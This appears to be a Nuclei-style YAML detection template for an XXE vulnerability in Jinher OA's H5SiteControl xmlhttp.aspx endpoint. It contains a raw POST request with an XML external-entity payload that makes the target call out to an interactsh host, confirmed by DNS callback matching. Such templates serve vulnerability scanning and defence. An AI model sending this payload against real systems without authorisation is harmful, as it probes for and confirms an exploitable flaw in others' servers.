id: poc-yaml-jinher-h5sitecontrol-xmlhttp-xxe
info:
  name: Jinher OA H5SiteControl XMLHttp XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
        %remote;]>
        <root/>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Cookie:"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
